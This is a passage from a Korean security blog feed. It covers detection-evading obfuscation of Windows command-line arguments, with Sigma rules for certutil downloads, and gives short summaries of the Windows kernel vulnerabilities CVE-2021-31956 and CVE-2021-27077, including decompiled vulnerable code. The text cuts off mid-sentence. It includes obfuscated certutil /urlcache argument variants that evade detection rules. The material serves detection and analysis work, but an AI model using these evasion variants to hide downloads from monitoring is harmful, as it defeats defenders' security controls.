&#xC0AC;&#xC774;&#xC5D0;&#xC11C; &#xBAA8;&#xD638;&#xC131;&#xC774; &#xC5C6;&#xB294; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; &#xB2E8;&#xCD95;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. <code>/noprofile</code>&#xC758; &#xAC00;&#xC7A5; &#xC9E7;&#xC740; &#xB2E8;&#xCD95;&#xC740; <code>/no</code>&#xB294; <code>/noexit</code>&#xC640; &#xCDA9;&#xB3CC; &#xB54C;&#xBB38;&#xC5D0; <code>/nop</code>&#xC774;&#xB2E4;. Powershell&#xC758; &#xACBD;&#xC6B0; &#xC55E;&#xC758; &#xB450; &#xBB38;&#xC790;&#xB85C; &#xCD95;&#xC57D;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; <code>/ec</code>&#xB3C4; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;.</p><h1 id="&#xB09C;&#xB3C5;&#xD654;&#xB41C;-command-line&#xC774;-&#xC788;&#xB294;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;-&#xCC3E;&#xAE30;"><a href="#&#xB09C;&#xB3C5;&#xD654;&#xB41C;-command-line&#xC774;-&#xC788;&#xB294;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;-&#xCC3E;&#xAE30;" class="headerlink" title="&#xB09C;&#xB3C5;&#xD654;&#xB41C; command line&#xC774; &#xC788;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xCC3E;&#xAE30;"></a>&#xB09C;&#xB3C5;&#xD654;&#xB41C; command line&#xC774; &#xC788;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xCC3E;&#xAE30;</h1><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C;&#xB300;&#xB85C; command line &#xC778;&#xC790;&#xB97C; &#xD578;&#xB4E4;&#xB9C1;&#xD558;&#xB294;&#xB370; &#xD45C;&#xC900;&#xC774; &#xC5C6;&#xB2E4;. &#xC77C;&#xBD80; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC5C4;&#xACA9;&#xD558;&#xC9C0;&#xB9CC; &#xC5B4;&#xB5A4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC720;&#xC5F0;&#xD558;&#xB2E4;. &#xD2B9;&#xC815;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; command line&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xB0B4;&#xB294; &#xAC83;&#xB3C4; &#xBB38;&#xC81C;&#xB2E4;. </p><p>&#xC774;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xB294; &#xAC00;&#xC7A5; &#xD655;&#xC2E4;&#xD55C; &#xBC29;&#xBC95;&#xC740; &#xB9AC;&#xBC84;&#xC2F1;&#xC774;&#xC9C0;&#xB9CC; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xBCF5;&#xC7A1;&#xD568;&#xC744; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xC2DC;&#xAC04;&#xC774; &#xB9CE;&#xC774; &#xB4E0;&#xB2E4;. &#xC880; &#xB354; &#xD6A8;&#xACFC;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xC740; &#xBAA8;&#xB4E0; &#xC6B0;&#xD68C; &#xAE30;&#xBC95;&#xC744; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xC2DC;&#xB3C4;&#xD558;&#xACE0; &#xACB0;&#xACFC;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xC774; &#xC811;&#xADFC;&#xBC95;&#xC758; PoC &#xAD6C;&#xD604;&#xC744; &#xD1B5;&#xD574; &#xC704;&#xC758; &#xB2E4;&#xC12F; &#xAC00;&#xC9C0; &#xAE30;&#xBC95; &#xC911; &#xC5B4;&#xB290; &#xAC83;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xB2E4;. PoC&#xC758; &#xC790;&#xC138;&#xD55C; &#xC124;&#xBA85;&#xC740; <a href="https://github.com/wietze/windows-command-line-obfuscation">github</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h1 id="&#xD0D0;&#xC9C0;-&#xBB38;&#xC81C;-Problems-for-detection-1"><a href="#&#xD0D0;&#xC9C0;-&#xBB38;&#xC81C;-Problems-for-detection-1" class="headerlink" title="&#xD0D0;&#xC9C0; &#xBB38;&#xC81C; (Problems for detection)"></a>&#xD0D0;&#xC9C0; &#xBB38;&#xC81C; (Problems for detection)</h1><p>&#xD2B9;&#xC815; command line &#xC778;&#xC790;&#xAC00; &#xC788;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589;&#xC744; &#xD0D0;&#xC9C0;&#xD558;&#xB824;&#xBA74; synonymous command-line &#xC778;&#xC790;&#xAC00; &#xBB38;&#xC81C;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; <code>urlcache</code>&#xC640; <code>f</code> &#xC778;&#xC790;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; <code>certutil</code> &#xC2E4;&#xD589; &#xD0D0;&#xC9C0; Sigma &#xB8F0;&#xC744; &#xC791;&#xC131;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs less"><span class="hljs-attribute">detection</span>:    <span class="hljs-attribute">selection</span>:        <span class="hljs-attribute">Image</span>: <span class="hljs-string">&quot;*\\certutil.exe&quot;</span>        CommandLine|contains|<span class="hljs-attribute">all</span>:            - <span class="hljs-string">&quot;/urlcache&quot;</span>            - <span class="hljs-string">&quot;/f&quot;</span>    <span class="hljs-attribute">condition</span>: selection</code></pre><p>&#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xB370;, &#xD574;&#xCEE4;&#xAC00; <code>urlcache</code>, <code>/ur&#x1D38;cache</code>, <code>/&#x209E;urlcache</code>, <code>/url&quot;cach&quot;e</code>, &#xD30C;&#xBA78;&#xC801;&#xC73C;&#xB85C; <code>&#x209E;u&#x209E;r&#x1D38;&quot;c&#x209E;a&#x209E;ch&quot;e</code> &#xB4F1;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xACBD;&#xC6B0; command&#xB294; &#xB3D9;&#xC791;&#xD558;&#xC9C0;&#xB9CC; &#xD589;&#xC704;&#xB97C; &#xD0D0;&#xC9C0;&#xD560; &#xC218; &#xC5C6;&#xB2E4;. &#xADDC;&#xCE59;&#xC5D0; &#xBAA8;&#xB4E0; &#xBCC0;&#xD615;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xBD88;&#xAC00;&#xB2A5;&#xD55C;&#xB370;, &#xB2E4;&#xC591;&#xD55C; &#xC6B0;&#xD68C; &#xAE30;&#xBC95;&#xC744; &#xC870;&#xD569;&#xD558;&#xBA74; &#xC218;&#xBC31;&#xB9CC; &#xAC1C;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xB2E4;.</p><p><img src="/2021/08/01/idioth/windows_cmd_obfuscation/Untitled%205.png" alt></p><blockquote><p><code>certutil -f -urlcache -split [https://wietze.github.io/robots.txt](https://wietze.github.io/robots.txt) output.txt</code>&#xC758; &#xB09C;&#xB3C5;&#xD654; &#xBC84;&#xC804;</p></blockquote><p>&#xC2DC;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xB294; &#xD55C; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC740; &#xBCF4;&#xD3B8;&#xC801;&#xC778; &#xADDC;&#xCE59;&#xC744; &#xB9CC;&#xB4DC;&#xB294; &#xAC83;&#xC774;&#xB2E4;. option char&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xC5EC; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs less"><span class="hljs-attribute">detection</span>:    <span class="hljs-attribute">selection</span>:        <span class="hljs-attribute">Image</span>: <span class="hljs-string">&quot;*\\certutil.exe&quot;</span>        CommandLine|contains|<span class="hljs-attribute">all</span>:            - <span class="hljs-string">&quot;urlcache&quot;</span>            - <span class="hljs-string">&quot;f&quot;</span>    <span class="hljs-attribute">condition</span>: selection</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; &#xC644;&#xBCBD;&#xD55C; &#xD574;&#xACB0;&#xCC45;&#xC740; &#xC544;&#xB2CC;&#xB370;, <code>f</code>&#xB9CC; &#xCC3E;&#xB294; &#xAC70;&#xB294; &#xC624;&#xD0D0;&#xB960;&#xC774; &#xB9CE;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xD655;&#xB960;&#xC774; &#xC788;&#xB2E4;.</p><p>&#xB450; &#xBC88;&#xC9F8; &#xBC29;&#xBC95;&#xC740; matching option&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC2E4;&#xD589;&#xC744; &#xAC80;&#xC0C9;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC788;&#xB294; &#xB9CE;&#xC740; EDR &#xB3C4;&#xAD6C;&#xB294; &#xC704;&#xC758; &#xC608;&#xC2DC;&#xC640; &#xAC19;&#xC774; &#xB2E8;&#xC21C;&#xD55C; &#xBB38;&#xC790;&#xC5F4; &#xD3EC;&#xD568; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. &#xC815;&#xADDC;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xB294; &#xB4DC;&#xBB3C;&#xB2E4;. Sigma&#xAC00; regex&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0;&#xB9CC; 30&#xAC1C; &#xC911; 7&#xAC1C;&#xB9CC; &#xAD6C;&#xD604;&#xD55C;&#xB2E4;. &#xC81C;&#xC870; &#xC5C5;&#xCCB4;&#xAC00; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xC774; &#xC635;&#xC158;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xC774;&#xC720;&#xB294; &#xC131;&#xB2A5; &#xB54C;&#xBB38;&#xC774;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC815;&#xADDC;&#xC2DD;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xD234;&#xC758; &#xACBD;&#xC6B0; option char &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs less"><span class="hljs-attribute">detection</span>:    <span class="hljs-attribute">selection</span>:        <span class="hljs-attribute">Image</span>: <span class="hljs-string">&quot;*\\certutil.exe&quot;</span>        CommandLine|<span class="hljs-attribute">re</span>: <span class="hljs-string">&quot;^(?=.*[-/\\]urlcache)(?=.*[-/\\]f).+.*&quot;</span>    <span class="hljs-attribute">condition</span>: selection</code></pre><p>&#xC815;&#xADDC;&#xC2DD;&#xC740; &#xB610; shorthand&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xB294; &#xB370; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC9C0;&#xB9CC;, character instertion&#xACFC; substituion&#xC740; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;.</p><h1 id="Robust-and-resilient-detctions"><a href="#Robust-and-resilient-detctions" class="headerlink" title="Robust and resilient detctions"></a>Robust and resilient detctions</h1><p>&#xADDC;&#xCE59;&#xC744; &#xD569;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xB113;&#xAC8C; &#xC815;&#xC758;&#xD558;&#xC5EC; &#xBAA8;&#xB4E0; &#xBCC0;&#xD615;&#xC744; &#xD0D0;&#xC9C0;&#xD558;&#xACE0; &#xC624;&#xD0D0;&#xB960;&#xC744; &#xACE0;&#xB824;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. PoC&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xADDC;&#xCE59;&#xC774; &#xD5C8;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xB450;&#xBC88;&#xC9F8;&#xB85C; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xD234;&#xC758; &#xCD9C;&#xB825;&#xC744; &#xD45C;&#xC900;&#xD654;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xB3C4;&#xC6C0;&#xC774; &#xB41C;&#xB2E4;. &#xB370;&#xC774;&#xD130;&#xAC00; &#xBD84;&#xC11D; &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xB418;&#xAE30; &#xC804;&#xC5D0; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xB418;&#xBA74; &#xBAA8;&#xB4E0; &#xD2B9;&#xC218; &#xBB38;&#xC790;&#xB97C; ASCII&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xACE0; &#xC54C;&#xD30C;&#xBCB3;&#xC774; &#xC544;&#xB2CC; &#xBAA8;&#xB4E0; &#xAC12;&#xC744; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xD544;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xBA74; &#xC88B;&#xB2E4;.</p><p>&#xB610; &#xB370;&#xC774;&#xD130; &#xBD84;&#xC11D;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB09C;&#xB3C5;&#xD654; &#xC2DC;&#xB3C4; &#xC790;&#xCCB4;&#xB97C; &#xD0D0;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xB2E4;. IT &#xC804;&#xBC18;&#xC5D0; &#xC0AC;&#xC6A9;&#xB960;&#xC774; &#xB0AE;&#xC740; &#xBB38;&#xC790;&#xAC00; &#xD3EC;&#xD568;&#xB41C; command line&#xC744; &#xD655;&#xC778;&#xD558;&#xAC70;&#xB098; &#xBB38;&#xC790; &#xBC00;&#xB3C4;, ASCII&#xAC00; &#xC544;&#xB2CC; &#xBB38;&#xC790;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xC778;&#xC790; &#xD0D0;&#xC9C0; &#xB4F1;&#xC774; &#xB3C4;&#xC6C0;&#xC774; &#xB41C;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>cmd</tag>
      
      <tag>obfuscation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31956 Exploiting the Windows Kernel (NTFS with WNF) – Part 1</title>
    <link href="/2021/07/30/j0ker/2021-07-30/"/>
    <url>/2021/07/30/j0ker/2021-07-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://research.nccgroup.com/2021/07/15/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/">https://research.nccgroup.com/2021/07/15/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&lt; Windows 10 20H2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2021-31956&#xC740; &#xCE74;&#xC2A4;&#xD37C;&#xC2A4;&#xD0A4;&#xAC00; 5&#xC6D4;&#xC5D0; &#xC2E4;&#xC81C; &#xACF5;&#xACA9;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xD55C; &#xC81C;&#xB85C;&#xB370;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>ntfs.sys</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; <code>NtfsQueryEaUserEaList</code>&#xB77C;&#xB294; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">NtfsQueryEaUserEaList</span><span class="hljs-params">(__int64 a1, __int64 eas_blocks_for_file, __int64 a3, __int64 out_buf, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> out_buf_length, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a6, <span class="hljs-keyword">char</span> a7)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> padding; <span class="hljs-comment">// er15</span>  padding = <span class="hljs-number">0</span>;   <span class="hljs-keyword">for</span> ( i = a6; ; i = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)i + *i) )    {      <span class="hljs-keyword">if</span> ( i == v11 )      {        v15 = occupied_length;        out_buf_pos = (_DWORD *)(out_buf + padding + occupied_length);        <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)NtfsLocateEaByName(                                ea_blocks_for_file,                                *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(a3 + <span class="hljs-number">4</span>),                                &amp;DestinationString,                                &amp;ea_block_pos) )        {          ea_block = (FILE_FULL_EA_INFORMATION *)(ea_blocks_for_file + ea_block_pos);          ea_block_size = ea_block-&gt;EaNameLength + ea_block-&gt;EaValueLength + <span class="hljs-number">9</span>;           <span class="hljs-comment">// Attacker controlled from Ea</span>          <span class="hljs-keyword">if</span> ( ea_block_size &lt;= out_buf_length - padding )                                <span class="hljs-comment">// The check which can underflow</span>          {            memmove(out_buf_pos, ea_block, ea_block_size);            *out_buf_pos = <span class="hljs-number">0</span>;            <span class="hljs-keyword">goto</span> LABEL_8;          }        }           *((_BYTE *)out_buf_pos + *((<span class="hljs-keyword">unsigned</span> __int8 *)v11 + <span class="hljs-number">4</span>) + <span class="hljs-number">8</span>) = <span class="hljs-number">0</span>;LABEL_8:            v18 = ea_block_size + padding + v15;            occupied_length = v18;            <span class="hljs-keyword">if</span> ( !a7 )            {              <span class="hljs-keyword">if</span> ( v23 )                *v23 = (_DWORD)out_buf_pos - (_DWORD)v23;              <span class="hljs-keyword">if</span> ( *v11 )              {                v23 = out_buf_pos;                out_buf_length -= ea_block_size + padding;                padding = ((ea_block_size + <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0xFFFFFFFC</span>) - ea_block_size;                <span class="hljs-keyword">goto</span> LABEL_24;              }            }</code></pre><p>&#xC774; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xBC18;&#xBCF5;&#xBB38;&#xC744; &#xB3CC;&#xBA74;&#xC11C; NTFS Ea(Extended Attribute)&#xC758; &#xB0B4;&#xC6A9;&#xC744; output buffer&#xC5D0; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xBCF5;&#xC0AC;&#xD560; &#xB0B4;&#xC6A9;&#xC758; &#xAE38;&#xC774;&#xB294; <code>ea_block_size = ea_block-&gt;EaNameLength + ea_block-&gt;EaValueLength + 9;</code>&#xB97C; &#xD1B5;&#xD574; EA &#xC774;&#xB984;&#xC758; &#xAE38;&#xC774;&#xC640; &#xAC12;&#xC758; &#xAE38;&#xC774;&#xC5D0; 9&#xB97C; &#xB354;&#xD574; &#xACC4;&#xC0B0; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBCF5;&#xC0AC; &#xC9C1;&#xC804;&#xC5D0;&#xB294; <code>ea_block_size &lt;= out_buf_length - padding</code>&#xB97C; &#xD1B5;&#xD574; &#xBCF5;&#xC0AC;&#xD560; &#xBE14;&#xB85D;&#xC758; &#xC0AC;&#xC774;&#xC988;&#xAC00; &#xB0A8;&#xC740; output buffer&#xC758; &#xC0AC;&#xC774;&#xC988;&#xBCF4;&#xB2E4; &#xD070;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xBCF5;&#xC0AC;&#xB41C; &#xB0B4;&#xC6A9;&#xC740; 32&#xBE44;&#xD2B8;&#xB85C; &#xC815;&#xB82C;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774; &#xB54C; &#xC774;&#xC804; &#xBE14;&#xB85D;&#xC758; &#xC0AC;&#xC774;&#xC988;&#xC5D0; &#xB9DE;&#xCDB0; <code>padding = ((ea_block_size + 3) &amp; 0xFFFFFFFC) - ea_block_size;</code>&#xB85C; &#xACC4;&#xC0B0;&#xB41C; &#xD328;&#xB529; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xBE7C;&#xACE0; &#xACC4;&#xC0B0; &#xB429;&#xB2C8;&#xB2E4;. &#xC989; padding &#xC0AC;&#xC774;&#xC988;&#xB294; 1~3 &#xC0AC;&#xC774;&#xC758; &#xAC12;&#xC744; &#xAC00;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. out_buf_length&#xB294; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xAC12;&#xC5D0;&#xC11C; ea_black_size&#xC640; padding&#xC744; &#xB354;&#xD55C; &#xAC12;&#xC744; &#xACC4;&#xC18D; &#xBE8D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC6B0;&#xC5F0;&#xD788; &#xC815;&#xD655;&#xD558;&#xAC8C; out_buf_length&#xAC00; &#xB531; &#xC815;&#xD655;&#xD788; 0&#xC774; &#xB420; &#xC0C1;&#xD669;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xACA0;&#xC8E0;? &#xB124;. out_buf_length&#xAC00; 0&#xC774; &#xB418;&#xB294; &#xC21C;&#xAC04; <code>ea_block_size &lt;= out_buf_length - padding</code>&#xC5D0;&#xC11C; integer underflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB2E4;&#xC74C; EA &#xBE14;&#xB7ED;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; output buffer&#xAC00; &#xD560;&#xB2F9;&#xB41C; &#xBC14;&#xB85C; &#xB4A4;&#xC758; &#xBC84;&#xD37C;&#xC5D0; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. output buffer&#xB294; pool&#xB85C; &#xD560;&#xB2F9;&#xC774; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; pool overflow? oob write? &#xAC00; &#xB418;&#xACA0;&#xB124;&#xC694;.</p><p>&#xC774; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xCDE8;&#xC57D;&#xC810; &#xB0B4;&#xC6A9;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xD2B8;&#xB9AC;&#xAC70; &#xBC29;&#xBC95;, &#xC775;&#xC2A4; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xB3C4; &#xB2E4;&#xB8E8;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; 2&#xD3B8;&#xC5D0;&#xC11C;&#xB294; reliable&#xD558;&#xAC8C; &#xC775;&#xC2A4;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB2E4;&#xB8EC;&#xB2E4;&#xACE0; &#xD558;&#xB2C8; &#xAD00;&#xC2EC; &#xC788;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; &#xD55C;&#xBC88; &#xC0B4;&#xD3B4;&#xBCF4;&#xC2DC;&#xAE38; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;. &#xC800;&#xB3C4; angr &#xC2DC;&#xB9AC;&#xC988;&#xAC00; &#xB05D;&#xB098;&#xBA74; &#xC708;&#xB3C4;&#xC6B0; &#xCEE4;&#xB110; &#xCDE8;&#xC57D;&#xC810;&#xB4E4; &#xBD84;&#xC11D;&#xD574;&#xC11C; &#xC5F0;&#xAD6C;&#xAE00; &#xC62C;&#xB824;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>windows</tag>
      
      <tag>j0ker</tag>
      
      <tag>ntfs</tag>
      
      <tag>wnf</tag>
      
      <tag>cve-2021-31956</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27077: SELECTING BITMAPS INTO MISMATCHED DEVICE CONTEXTS</title>
    <link href="/2021/07/29/idioth/2021-07-29/"/>
    <url>/2021/07/29/idioth/2021-07-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/7/26/cve-2021-27077-selecting-bitmaps-into-mismatched-device-contexts">CVE-2021-27077: SELECTING BITMAPS INTO MISMATCHED DEVICE CONTEXTS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows&#xC5D0;&#xC11C; device context&#xC5D0;&#xC11C; bitmap&#xC744; &#xC120;&#xD0DD;&#xD558;&#xC5EC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xBC0F; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Device context&#xB294; Windows&#xC5D0;&#xC11C; &#xD53D;&#xC140; &#xAE30;&#xBC18; &#xC7A5;&#xCE58;&#xC5D0; &#xBB34;&#xC5B8;&#xAC00;&#xB97C; &#xADF8;&#xB9AC;&#xAE30; &#xC704;&#xD574; &#xC81C;&#xACF5;&#xB429;&#xB2C8;&#xB2E4;. Device context&#xB294; user-mode code&#xC640; low-level device driver &#xC0AC;&#xC774;&#xC5D0; &#xCD94;&#xC0C1; &#xACC4;&#xCE35;&#xC774;&#xBA70; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xCC98;&#xB7FC; &#xC791;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;. Screen-related&#xC640; print-related &#xC77C; &#xC218; &#xC788;&#xC73C;&#xBA70; device context&#xB294; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD544;&#xB4DC; &#xC911; <code>hdev</code> &#xD544;&#xB4DC;&#xB294; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB2E4;&#xB978; &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; bitmap&#xC740; surface object&#xB85C; &#xD45C;&#xD604;&#xB418;&#xBA70; &#xC774; &#xAD6C;&#xC870;&#xCCB4; &#xB610;&#xD55C; <code>hdev</code>&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. printer-related device context&#xC640; screen-related device context&#xB97C; &#xD558;&#xB098;&#xC529; &#xC0DD;&#xC131;&#xD55C; &#xD6C4;, &#xBAA8;&#xB4E0; device context&#xC5D0;&#xC11C; &#xD638;&#xD658; &#xAC00;&#xB2A5;&#xD55C; monochrome (1 bite deep) bitmap&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; Printer DC&#xC5D0;&#xC11C; bitmap&#xC744; &#xC120;&#xD0DD;&#xD558;&#xBA74; bitmap&#xC758; <code>hdev</code>&#xB294; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; printer device object&#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; bitmap &#xC120;&#xD0DD;&#xC744; &#xD574;&#xC81C;&#xD55C; &#xD6C4; &#xB2E4;&#xC2DC; Screen DC&#xC5D0;&#xC11C; bitmap&#xC744; 